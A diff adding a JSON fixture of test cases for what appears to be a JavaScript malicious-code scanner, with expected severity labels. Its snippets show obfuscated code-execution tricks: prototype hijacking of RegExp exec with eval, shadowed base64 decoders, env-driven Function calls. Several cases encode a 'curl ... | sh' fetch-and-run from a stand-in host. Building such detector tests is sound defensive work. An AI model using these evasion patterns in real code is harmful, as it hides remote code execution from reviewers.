@@ -1,0 +1,537 @@
+[
+  {
+    "id": "regex-reflect-literal",
+    "source": "Reflect.set(Object.getPrototypeOf(/x/), '<exec>', <eval>);\n/x/.<exec>(<atob>('Z2xvYmFsVGhpcy5yZXZpZXdNYXJrZXIgPSAxOw=='));\n",
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "regex-reflect-bound",
+    "source": "Reflect.set(Object.getPrototypeOf(/x/), '<exec>', <eval>);\nconst re=/x/;\nre.<exec>(<atob>('Z2xvYmFsVGhpcy5yZXZpZXdNYXJrZXIgPSAxOw=='));\n",
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "regex-reflect-new",
+    "source": "Reflect.set(Object.getPrototypeOf(/x/), '<exec>', <eval>);\nnew RegExp('x').<exec>(<atob>('Z2xvYmFsVGhpcy5yZXZpZXdNYXJrZXIgPSAxOw=='));\n",
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "regex-reflect-computed-literal",
+    "source": "Reflect.set(Object.getPrototypeOf(/x/), 'ex'+'ec', <eval>);\n/x/.<exec>(<atob>('Z2xvYmFsVGhpcy5yZXZpZXdNYXJrZXIgPSAxOw=='));\n",
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "regex-reflect-computed-bound",
+    "source": "Reflect.set(Object.getPrototypeOf(/x/), 'ex'+'ec', <eval>);\nconst re=/x/;\nre.<exec>(<atob>('Z2xvYmFsVGhpcy5yZXZpZXdNYXJrZXIgPSAxOw=='));\n",
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "regex-reflect-computed-new",
+    "source": "Reflect.set(Object.getPrototypeOf(/x/), 'ex'+'ec', <eval>);\nnew RegExp('x').<exec>(<atob>('Z2xvYmFsVGhpcy5yZXZpZXdNYXJrZXIgPSAxOw=='));\n",
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "regex-define-computed-literal",
+    "source": "Object.defineProperty(Object.getPrototypeOf(/x/), 'ex'+'ec', {value:<eval>});\n/x/.<exec>(<atob>('Z2xvYmFsVGhpcy5yZXZpZXdNYXJrZXIgPSAxOw=='));\n",
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "regex-define-computed-bound",
+    "source": "Object.defineProperty(Object.getPrototypeOf(/x/), 'ex'+'ec', {value:<eval>});\nconst re=/x/;\nre.<exec>(<atob>('Z2xvYmFsVGhpcy5yZXZpZXdNYXJrZXIgPSAxOw=='));\n",
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "regex-define-computed-new",
+    "source": "Object.defineProperty(Object.getPrototypeOf(/x/), 'ex'+'ec', {value:<eval>});\nnew RegExp('x').<exec>(<atob>('Z2xvYmFsVGhpcy5yZXZpZXdNYXJrZXIgPSAxOw=='));\n",
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "regex-proto-computed-literal",
+    "source": "Object.getPrototypeOf(/x/)['ex'+'ec'] = <eval>;\n/x/.<exec>(<atob>('Z2xvYmFsVGhpcy5yZXZpZXdNYXJrZXIgPSAxOw=='));\n",
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "regex-proto-computed-bound",
+    "source": "Object.getPrototypeOf(/x/)['ex'+'ec'] = <eval>;\nconst re=/x/;\nre.<exec>(<atob>('Z2xvYmFsVGhpcy5yZXZpZXdNYXJrZXIgPSAxOw=='));\n",
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "regex-proto-computed-new",
+    "source": "Object.getPrototypeOf(/x/)['ex'+'ec'] = <eval>;\nnew RegExp('x').<exec>(<atob>('Z2xvYmFsVGhpcy5yZXZpZXdNYXJrZXIgPSAxOw=='));\n",
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "regex-constructor-proto-literal",
+    "source": "const C = /x/.constructor; C.prototype['ex'+'ec'] = <eval>;\n/x/.<exec>(<atob>('Z2xvYmFsVGhpcy5yZXZpZXdNYXJrZXIgPSAxOw=='));\n",
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "regex-constructor-proto-bound",
+    "source": "const C = /x/.constructor; C.prototype['ex'+'ec'] = <eval>;\nconst re=/x/;\nre.<exec>(<atob>('Z2xvYmFsVGhpcy5yZXZpZXdNYXJrZXIgPSAxOw=='));\n",
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "regex-constructor-proto-new",
+    "source": "const C = /x/.constructor; C.prototype['ex'+'ec'] = <eval>;\nnew RegExp('x').<exec>(<atob>('Z2xvYmFsVGhpcy5yZXZpZXdNYXJrZXIgPSAxOw=='));\n",
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "regex-dynamic-literal",
+    "source": "<eval>(process.env.REVIEW_SETUP);\n/x/.<exec>(<atob>('Z2xvYmFsVGhpcy5yZXZpZXdNYXJrZXIgPSAxOw=='));\n",
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "regex-function-dynamic-literal",
+    "source": "<Function>(process.env.REVIEW_SETUP)();\n/x/.<exec>(<atob>('Z2xvYmFsVGhpcy5yZXZpZXdNYXJrZXIgPSAxOw=='));\n",
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "regex-function-dynamic-bound",
+    "source": "<Function>(process.env.REVIEW_SETUP)();\nconst re=/x/;\nre.<exec>(<atob>('Z2xvYmFsVGhpcy5yZXZpZXdNYXJrZXIgPSAxOw=='));\n",
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "regex-function-dynamic-new",
+    "source": "<Function>(process.env.REVIEW_SETUP)();\nnew RegExp('x').<exec>(<atob>('Z2xvYmFsVGhpcy5yZXZpZXdNYXJrZXIgPSAxOw=='));\n",
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "rebind-global-reflect",
+    "source": "Reflect.set(globalThis,'RegExp',function(){return {['ex'+'ec']:<eval>}});\nnew RegExp('x').<exec>(<atob>('Z2xvYmFsVGhpcy5yZXZpZXdNYXJrZXIgPSAxOw=='));\n",
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "rebind-global-define",
+    "source": "Object.defineProperty(globalThis,'RegExp',{value:function(){return {['ex'+'ec']:<eval>}}});\nnew RegExp('x').<exec>(<atob>('Z2xvYmFsVGhpcy5yZXZpZXdNYXJrZXIgPSAxOw=='));\n",
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "encoder-buffer-from",
+    "source": "<from> = () => ({toString:()=>process.env.REVIEW_CODE});\nconst encodedScript = <from>('console.log(1)').toString('base64');\nrequire('<cp>').<exec>Sync(`node -e \"<eval>(<from>('${encodedScript}','base64').toString('utf8'))\"`);\n",
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "encoder-control-buffer-from",
+    "source": "\nconst encodedScript = <from>('console.log(1)').toString('base64');\nrequire('<cp>').<exec>Sync(`node -e \"<eval>(<from>('${encodedScript}','base64').toString('utf8'))\"`);\n",
+    "expected": [
+      "INFO"
+    ]
+  },
+  {
+    "id": "encoder-buffer-tostring",
+    "source": "Buffer.prototype.toString = () => process.env.REVIEW_CODE;\nconst encodedScript = <from>('console.log(1)').toString('base64');\nrequire('<cp>').<exec>Sync(`node -e \"<eval>(<from>('${encodedScript}','base64').toString('utf8'))\"`);\n",
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "encoder-control-buffer-tostring",
+    "source": "\nconst encodedScript = <from>('console.log(1)').toString('base64');\nrequire('<cp>').<exec>Sync(`node -e \"<eval>(<from>('${encodedScript}','base64').toString('utf8'))\"`);\n",
+    "expected": [
+      "INFO"
+    ]
+  },
+  {
+    "id": "encoder-btoa-assign",
+    "source": "btoa = () => process.env.REVIEW_CODE;\nconst encodedScript = btoa('console.log(1)');\nrequire('<cp>').<exec>Sync(`node -e \"<eval>(<atob>('${encodedScript}'))\"`);\n",
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "encoder-control-btoa-assign",
+    "source": "\nconst encodedScript = btoa('console.log(1)');\nrequire('<cp>').<exec>Sync(`node -e \"<eval>(<atob>('${encodedScript}'))\"`);\n",
+    "expected": [
+      "INFO"
+    ]
+  },
+  {
+    "id": "encoder-btoa-global",
+    "source": "globalThis.btoa = () => process.env.REVIEW_CODE;\nconst encodedScript = btoa('console.log(1)');\nrequire('<cp>').<exec>Sync(`node -e \"<eval>(<atob>('${encodedScript}'))\"`);\n",
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "encoder-control-btoa-global",
+    "source": "\nconst encodedScript = btoa('console.log(1)');\nrequire('<cp>').<exec>Sync(`node -e \"<eval>(<atob>('${encodedScript}'))\"`);\n",
+    "expected": [
+      "INFO"
+    ]
+  },
+  {
+    "id": "encoder-btoa-reflect",
+    "source": "Reflect.set(globalThis,'btoa',()=>process.env.REVIEW_CODE);\nconst encodedScript = btoa('console.log(1)');\nrequire('<cp>').<exec>Sync(`node -e \"<eval>(<atob>('${encodedScript}'))\"`);\n",
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "encoder-control-btoa-reflect",
+    "source": "\nconst encodedScript = btoa('console.log(1)');\nrequire('<cp>').<exec>Sync(`node -e \"<eval>(<atob>('${encodedScript}'))\"`);\n",
+    "expected": [
+      "INFO"
+    ]
+  },
+  {
+    "id": "encoder-uri-assign",
+    "source": "encodeURIComponent = () => process.env.REVIEW_CODE;\nconst encodedScript = encodeURIComponent('console.log(1)');\nrequire('<cp>').<exec>Sync(`node -e \"<eval>(<duc>('${encodedScript}'))\"`);\n",
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "encoder-control-uri-assign",
+    "source": "\nconst encodedScript = encodeURIComponent('console.log(1)');\nrequire('<cp>').<exec>Sync(`node -e \"<eval>(<duc>('${encodedScript}'))\"`);\n",
+    "expected": [
+      "INFO"
+    ]
+  },
+  {
+    "id": "encoder-escape-assign",
+    "source": "escape = () => process.env.REVIEW_CODE;\nconst encodedScript = escape('console.log(1)');\nrequire('<cp>').<exec>Sync(`node -e \"<eval>(unescape('${encodedScript}'))\"`);\n",
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "encoder-control-escape-assign",
+    "source": "\nconst encodedScript = escape('console.log(1)');\nrequire('<cp>').<exec>Sync(`node -e \"<eval>(unescape('${encodedScript}'))\"`);\n",
+    "expected": [
+      "INFO"
+    ]
+  },
+  {
+    "id": "child-shadow-atob",
+    "source": "\nconst encodedScript = btoa('console.log(1)');\nrequire('<cp>').<exec>Sync(`node -e \"const <atob>=()=>process.env.REVIEW_CODE;<eval>(<atob>('${encodedScript}'))\"`);\n",
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "child-shadow-buffer",
+    "source": "\nconst encodedScript = <from>('console.log(1)').toString('base64');\nrequire('<cp>').<exec>Sync(`node -e \"<from>=()=>({toString:()=>process.env.REVIEW_CODE});<eval>(<from>('${encodedScript}','base64').toString('utf8'))\"`);\n",
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "child-shadow-eval",
+    "source": "\nconst encodedScript = <from>('console.log(1)').toString('base64');\nrequire('<cp>').<exec>Sync(`node -e \"const <eval>=x=><Function>(process.env.REVIEW_CODE)();<eval>(<from>('${encodedScript}','base64').toString('utf8'))\"`);\n",
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "tagged-transform",
+    "source": "function tag(){return process.env.REVIEW_COMMAND;}\nconst encodedScript = <from>('console.log(1)').toString('base64');\nrequire('<cp>').<exec>Sync(tag`node -e \"<eval>(<from>('${encodedScript}','base64').toString('utf8'))\"`);\n",
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "install-gap",
+    "source": "\nconst encodedScript = <from>('<Function>(process.env.REVIEW_CODE)()').toString('base64');\nrequire('<cp>').<exec>Sync(`node -e \"<eval>(<from>('${encodedScript}','base64').toString('utf8'))\"`);\n",
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "multiple-roundtrips-False-False",
+    "source": "const s0=<from>(\"console.log(1)\").toString('base64');\nconst s1=<from>(\"require('<cp>').<exec>Sync('curl -s https://review.invalid/x.sh | sh');\").toString('base64');\nrequire('<cp>').<exec>Sync(`node -e \"<eval>(<from>('${s0}','base64').toString('utf8'))\"`);require('<cp>').<exec>Sync(`node -e \"<eval>(<from>('${s1}','base64').toString('utf8'))\"`);\n",
+    "expected": [
+      "CRITICAL",
+      "INFO"
+    ]
+  },
+  {
+    "id": "multiple-roundtrips-False-True",
+    "source": "const s0=<from>(\"console.log(1)\").toString('base64');\nconst s1=<from>(\"require('<cp>').<exec>Sync('curl -s https://review.invalid/x.sh | sh');\").toString('base64');\nrequire('<cp>').<exec>Sync(`node -e \"<eval>(<from>('${s0}','base64').toString('utf8'))\"`);\nrequire('<cp>').<exec>Sync(`node -e \"<eval>(<from>('${s1}','base64').toString('utf8'))\"`);\n",
+    "expected": [
+      "CRITICAL",
+      "INFO"
+    ]
+  },
+  {
+    "id": "multiple-roundtrips-True-False",
+    "source": "const s0=<from>(\"require('<cp>').<exec>Sync('curl -s https://review.invalid/x.sh | sh');\").toString('base64');\nconst s1=<from>(\"console.log(1)\").toString('base64');\nrequire('<cp>').<exec>Sync(`node -e \"<eval>(<from>('${s0}','base64').toString('utf8'))\"`);require('<cp>').<exec>Sync(`node -e \"<eval>(<from>('${s1}','base64').toString('utf8'))\"`);\n",
+    "expected": [
+      "CRITICAL",
+      "INFO"
+    ]
+  },
+  {
+    "id": "multiple-roundtrips-True-True",
+    "source": "const s0=<from>(\"require('<cp>').<exec>Sync('curl -s https://review.invalid/x.sh | sh');\").toString('base64');\nconst s1=<from>(\"console.log(1)\").toString('base64');\nrequire('<cp>').<exec>Sync(`node -e \"<eval>(<from>('${s0}','base64').toString('utf8'))\"`);\nrequire('<cp>').<exec>Sync(`node -e \"<eval>(<from>('${s1}','base64').toString('utf8'))\"`);\n",
+    "expected": [
+      "CRITICAL",
+      "INFO"
+    ]
+  },
+  {
+    "id": "regex-class-asi",
+    "source": "class C {}\n/x/.<exec>(<atob>('Z2xvYmFsVGhpcy5yZXZpZXdNYXJrZXIgPSAxOw=='));\n",
+    "expected": []
+  },
+  {
+    "id": "regex-reflect-literal-size-1999999",
+    "source": "Reflect.set(Object.getPrototypeOf(/x/), '<exec>', <eval>);\n/x/.<exec>(<atob>('Z2xvYmFsVGhpcy5yZXZpZXdNYXJrZXIgPSAxOw=='));\n",
+    "size": 1999999,
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "regex-reflect-literal-size-2000001",
+    "source": "Reflect.set(Object.getPrototypeOf(/x/), '<exec>', <eval>);\n/x/.<exec>(<atob>('Z2xvYmFsVGhpcy5yZXZpZXdNYXJrZXIgPSAxOw=='));\n",
+    "size": 2000001,
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "regex-reflect-bound-size-1999999",
+    "source": "Reflect.set(Object.getPrototypeOf(/x/), '<exec>', <eval>);\nconst re=/x/;\nre.<exec>(<atob>('Z2xvYmFsVGhpcy5yZXZpZXdNYXJrZXIgPSAxOw=='));\n",
+    "size": 1999999,
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "regex-reflect-bound-size-2000001",
+    "source": "Reflect.set(Object.getPrototypeOf(/x/), '<exec>', <eval>);\nconst re=/x/;\nre.<exec>(<atob>('Z2xvYmFsVGhpcy5yZXZpZXdNYXJrZXIgPSAxOw=='));\n",
+    "size": 2000001,
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "regex-define-computed-literal-size-1999999",
+    "source": "Object.defineProperty(Object.getPrototypeOf(/x/), 'ex'+'ec', {value:<eval>});\n/x/.<exec>(<atob>('Z2xvYmFsVGhpcy5yZXZpZXdNYXJrZXIgPSAxOw=='));\n",
+    "size": 1999999,
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "regex-define-computed-literal-size-2000001",
+    "source": "Object.defineProperty(Object.getPrototypeOf(/x/), 'ex'+'ec', {value:<eval>});\n/x/.<exec>(<atob>('Z2xvYmFsVGhpcy5yZXZpZXdNYXJrZXIgPSAxOw=='));\n",
+    "size": 2000001,
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "regex-proto-computed-literal-size-1999999",
+    "source": "Object.getPrototypeOf(/x/)['ex'+'ec'] = <eval>;\n/x/.<exec>(<atob>('Z2xvYmFsVGhpcy5yZXZpZXdNYXJrZXIgPSAxOw=='));\n",
+    "size": 1999999,
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "regex-proto-computed-literal-size-2000001",
+    "source": "Object.getPrototypeOf(/x/)['ex'+'ec'] = <eval>;\n/x/.<exec>(<atob>('Z2xvYmFsVGhpcy5yZXZpZXdNYXJrZXIgPSAxOw=='));\n",
+    "size": 2000001,
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "regex-dynamic-literal-size-1999999",
+    "source": "<eval>(process.env.REVIEW_SETUP);\n/x/.<exec>(<atob>('Z2xvYmFsVGhpcy5yZXZpZXdNYXJrZXIgPSAxOw=='));\n",
+    "size": 1999999,
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "regex-dynamic-literal-size-2000001",
+    "source": "<eval>(process.env.REVIEW_SETUP);\n/x/.<exec>(<atob>('Z2xvYmFsVGhpcy5yZXZpZXdNYXJrZXIgPSAxOw=='));\n",
+    "size": 2000001,
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "rebind-global-reflect-size-1999999",
+    "source": "Reflect.set(globalThis,'RegExp',function(){return {['ex'+'ec']:<eval>}});\nnew RegExp('x').<exec>(<atob>('Z2xvYmFsVGhpcy5yZXZpZXdNYXJrZXIgPSAxOw=='));\n",
+    "size": 1999999,
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "rebind-global-reflect-size-2000001",
+    "source": "Reflect.set(globalThis,'RegExp',function(){return {['ex'+'ec']:<eval>}});\nnew RegExp('x').<exec>(<atob>('Z2xvYmFsVGhpcy5yZXZpZXdNYXJrZXIgPSAxOw=='));\n",
+    "size": 2000001,
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "encoder-btoa-assign-size-1999999",
+    "source": "btoa = () => process.env.REVIEW_CODE;\nconst encodedScript = btoa('console.log(1)');\nrequire('<cp>').<exec>Sync(`node -e \"<eval>(<atob>('${encodedScript}'))\"`);\n",
+    "size": 1999999,
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "encoder-btoa-assign-size-2000001",
+    "source": "btoa = () => process.env.REVIEW_CODE;\nconst encodedScript = btoa('console.log(1)');\nrequire('<cp>').<exec>Sync(`node -e \"<eval>(<atob>('${encodedScript}'))\"`);\n",
+    "size": 2000001,
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "encoder-buffer-from-size-1999999",
+    "source": "<from> = () => ({toString:()=>process.env.REVIEW_CODE});\nconst encodedScript = <from>('console.log(1)').toString('base64');\nrequire('<cp>').<exec>Sync(`node -e \"<eval>(<from>('${encodedScript}','base64').toString('utf8'))\"`);\n",
+    "size": 1999999,
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "encoder-buffer-from-size-2000001",
+    "source": "<from> = () => ({toString:()=>process.env.REVIEW_CODE});\nconst encodedScript = <from>('console.log(1)').toString('base64');\nrequire('<cp>').<exec>Sync(`node -e \"<eval>(<from>('${encodedScript}','base64').toString('utf8'))\"`);\n",
+    "size": 2000001,
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "same-line-regex-real-size-1999999",
+    "source": "/x/.<exec>(<atob>('eA==')); <eval>(<atob>('Z2xvYmFsVGhpcy5yZXZpZXdNYXJrZXIgPSAxOw=='));\n",
+    "size": 1999999,
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "same-line-regex-real-size-2000001",
+    "source": "/x/.<exec>(<atob>('eA==')); <eval>(<atob>('Z2xvYmFsVGhpcy5yZXZpZXdNYXJrZXIgPSAxOw=='));\n",
+    "size": 2000001,
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "same-line-regex-cp-size-1999999",
+    "source": "/x/.<exec>(<atob>('eA==')); require('<cp>').<exec>(<atob>('ZWNobyByZXZpZXc='));\n",
+    "size": 1999999,
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "same-line-regex-cp-size-2000001",
+    "source": "/x/.<exec>(<atob>('eA==')); require('<cp>').<exec>(<atob>('ZWNobyByZXZpZXc='));\n",
+    "size": 2000001,
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "eval-name-getter",
+    "source": "const o={get x(){Reflect.set(Object.getPrototypeOf(/x/),'ex'+'ec',<eval>);return 1;}};\n<eval>('o.x');\nconst re=/x/;\nre.<exec>(<atob>('Z2xvYmFsVGhpcy5yZXZpZXdNYXJrZXIgPSAxOw=='));\n",
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "child-decoder-substitution",
+    "source": "\nconst encodedScript = btoa('console.log(1)');\nrequire('<cp>').<exec>Sync(`node -e \"const <atob>=s=><from>(process.env.REVIEW_CODE,'base64').toString();<eval>(<atob>('${encodedScript}'))\"`);\n",
+    "expected": [
+      "BLOCKER"
+    ]
+  },
+  {
+    "id": "benign-literal",
+    "source": "/x/.<exec>(<atob>(x));",
+    "expected": []
+  },
+  {
+    "id": "benign-literal-1999999",
+    "source": "/x/.<exec>(<atob>(x));",
+    "expected": [],
+    "size": 1999999
+  },
+  {
+    "id": "benign-literal-2000001",
+    "source": "/x/.<exec>(<atob>(x));",
+    "expected": [],
+    "size": 2000001
+  },
+  {
+    "id": "benign-bound",
+    "source": "const r=/x/;r.<exec>(<atob>(x));",
+    "expected": []
+  },
+  {
+    "id": "benign-construction",
+    "source": "new RegExp('x').<exec>(<atob>(x));",
+    "expected": []
+  },
+  {
+    "id": "benign-unrelated-constructor",
+    "source": "const x=[];x.constructor;/x/.<exec>(<atob>(v));",
+    "expected": []
+  },
+  {
+    "id": "benign-unrelated-prototype",
+    "source": "Object.getPrototypeOf(1);/x/.<exec>(<atob>(v));",
+    "expected": []
+  },
+  {
+    "id": "install-gap-constructor-alias",
+    "source": "\nconst encodedScript = <from>('(function(){}).constructor(process.env.REVIEW_CODE)()').toString('base64');\nrequire('<cp>').<exec>Sync(`node -e \"<eval>(<from>('${encodedScript}','base64').toString('utf8'))\"`);\n",
+    "expected": [
+      "BLOCKER"
+    ]
+  }
+]
